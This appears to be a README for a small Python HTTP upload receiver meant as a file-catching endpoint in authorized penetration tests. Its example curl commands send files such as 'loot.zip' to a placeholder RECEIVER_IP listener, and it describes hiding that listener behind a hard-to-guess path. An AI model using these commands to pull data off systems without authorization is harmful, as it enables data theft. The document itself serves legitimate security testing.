# Lightweight POST Receiver

> **Work in progress:** This project is under active development. The current
> implementation is functional but intentionally minimal; review the documented
> limitations before using it during an engagement.

A minimal Python HTTP server that receives raw POST request bodies and writes
them to disk. It is intended as a quick file-catching endpoint during
authorized penetration tests and red-team exercises—the receiving counterpart
to Python's built-in `http.server`.

The implementation uses only the Python standard library.

## Requirements

- Python 3
- Network access from the sending host to TCP port `8000`

## Usage

Start the receiver from the project directory:

```console
$ python3 upload_server.py
```

By default it listens on all interfaces (`0.0.0.0`) at port `8000` and
creates an `uploads/` directory in the current working directory. All of
that is configurable:

```console
$ python3 upload_server.py --bind 0.0.0.0 --port 8443 --dir /tmp/loot \
    --max-size 536870912
```

| Option | Default | Description |
| --- | --- | --- |
| `--bind` | `0.0.0.0` | Address to listen on |
| `--port` | `8000` | TCP port to listen on |
| `--dir` | `uploads` | Destination directory (created if missing) |
| `--max-size` | `1073741824` (1 GiB) | Maximum accepted body size in bytes; `0` disables the limit |
| `--overwrite` | off | Overwrite existing files instead of adding a numeric suffix |
| `--token` | none (disabled) | Require this bearer token on every request |
| `--hash` | off | Compute and return a SHA-256 digest of each upload |
| `--path` | `/` | Only accept uploads POSTed to this path; other paths get `404` |

Send a file as the raw request body:

```console
$ curl --data-binary @loot.zip \
    "http://RECEIVER_IP:8000/?name=loot.zip"
```

Example response:

```text
Saved 42817 bytes to uploads/loot.zip
```

The `name` query parameter should be URL-encoded when it contains spaces or
other reserved characters:

```console
$ curl --data-binary @report.txt \
    "http://RECEIVER_IP:8000/?name=host%20report.txt"
```

If `name` is omitted or empty, the receiver generates a unique name such as
`upload-20260728T174817-fe19c9ff.bin`:

```console
$ curl --data-binary @payload.bin "http://RECEIVER_IP:8000/"
```

Uploading a name that already exists on disk does not overwrite it by
default — the receiver adds a numeric suffix (`loot.zip`, `loot.1.zip`,
`loot.2.zip`, ...). Pass `--overwrite` at startup if you want same-name
uploads to replace the existing file instead. Destination names are claimed
atomically, so simultaneous uploads to the same name never collide or clobber
each other, even with `--overwrite` off.

Check readiness with the health endpoint:

```console
$ curl http://RECEIVER_IP:8000/health
ok
```

Add `?format=json` (or send `Accept: application/json`) to any request,
including uploads, to get a JSON response instead of plain text:

```console
$ curl "http://RECEIVER_IP:8000/health?format=json"
{"status": 200, "message": "ok", "upload_dir": "/path/to/uploads", "max_size": 1073741824, "overwrite": false}

$ curl --data-binary @loot.zip "http://RECEIVER_IP:8000/?name=loot.zip&format=json"
{"status": 201, "message": "Saved 42817 bytes to uploads/loot.zip", "bytes": 42817, "elapsed_seconds": 0.012, "filename": "loot.zip"}
```

Pass `--token` to require a bearer token on every request. When set, requests
must include a matching `Authorization: Bearer TOKEN` header or they are
rejected with `401` before any data is read or any endpoint logic runs:

```console
$ python3 upload_server.py --token s3cr3t

$ curl -H "Authorization: Bearer s3cr3t" --data-binary @loot.zip \
    "http://RECEIVER_IP:8000/?name=loot.zip"
```

Auth is disabled by default (no `--token` given).

Pass `--hash` to have the receiver compute a SHA-256 digest of each upload
while it streams to disk, at no extra pass over the data:

```console
$ python3 upload_server.py --hash
$ curl --data-binary @loot.zip "http://RECEIVER_IP:8000/?name=loot.zip"
Saved 42817 bytes to uploads/loot.zip
SHA-256: 3a7bd3e2360a3d...
```

With `?format=json` the digest is returned as a `sha256` field instead.
Hashing is skipped entirely unless `--hash` is passed.

By default any path accepts uploads (`POST /`, `POST /whatever`, etc. all
work identically). Pass `--path` to restrict uploads to a single, specific
path — useful alongside `--token` to make the listener harder to stumble
onto, or in combination with a hard-to-guess path segment:

```console
$ python3 upload_server.py --path /drop-3f9a1c

$ curl --data-binary @loot.zip "http://RECEIVER_IP:8000/drop-3f9a1c?name=loot.zip"
```

Requests to any other path get `404`, same as an unknown `GET` path. This
check runs after the (optional) auth check but before anything else, so a
POST to the wrong path never touches disk. `GET /health` is unaffected by
`--path` and always stays available for readiness checks.

Press `Ctrl-C` in the receiver terminal to stop the server.

## Current behavior and limitations

- POST saves a file at the configured upload path (`/` by default); `GET
  /health` reports the running configuration; any other path or method
  returns `404`.
- Authentication is optional and off unless `--token` is passed; there is no
  encryption, so a bearer token is only as safe as the network it crosses.
- The request body is treated as opaque binary data; multipart form uploads
  are not parsed.
- Filenames are reduced to their basename before being placed in the upload
  directory, and path separators/reserved characters are stripped so
  POSIX- and Windows-style traversal attempts (`../`, `..\`) can't escape it.
- The request body is streamed to a temporary file and atomically renamed
  into place, so it is never fully buffered in memory and partial/failed
  uploads don't leave a truncated file at the final destination.
- `Content-Length` is required and validated; missing, non-numeric, negative,
  or over-`--max-size` requests are rejected before any data is read.
- Requests are handled concurrently (one thread per connection), so a slow
  or large upload doesn't block other clients.
- There is no encryption or fine-grained access control.

Because the listener binds to every network interface, use host firewall rules
and an engagement-controlled network to restrict who can reach it. Captured
files under `uploads/` are ignored by Git because they may contain sensitive
engagement data.

## Request format

```text
POST /?name=OUTPUT_FILENAME HTTP/1.1
Host: RECEIVER_IP:8000
Content-Length: NUMBER_OF_BYTES

RAW_FILE_BYTES
```

The server responds with `201 Created` after writing the body successfully.
